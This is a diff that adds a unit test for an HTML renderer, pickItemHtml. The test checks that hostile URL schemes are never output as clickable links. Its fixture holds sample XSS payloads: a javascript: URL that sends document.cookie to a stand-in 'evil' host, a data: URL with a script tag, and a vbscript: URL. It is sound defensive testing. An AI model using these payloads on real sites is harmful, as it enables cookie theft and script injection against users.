@@ -42,6 +42,21 @@ describe('pickItemHtml()', () => {
     expect(html).toContain('note &lt;one&gt;');
     expect(html).not.toContain('note <one>');
   });
+
+  it('neutralizes hostile URL schemes end-to-end (no clickable javascript:)', () => {
+    const hostile = pickItemHtml({
+      title: 'trap',
+      source_url: 'javascript:fetch("//evil/"+document.cookie)',
+      free_link: 'data:text/html,<script>alert(1)</script>',
+      paywalled: false,
+      surfaces: [{ url: 'vbscript:msgbox(1)', name: 'Evil', points: 1, comments: 0 }],
+    });
+    // No hostile scheme survives as an href anywhere in the rendered body...
+    expect(hostile).not.toMatch(/href="(?:javascript|data|vbscript):/i);
+    // ...and the labels degrade to plain text, not a dead-but-present link.
+    expect(hostile).toContain('Primary source');
+    expect(hostile).not.toContain('<a href="javascript');
+  });
 });
 
 describe('FEEDS registry', () => {
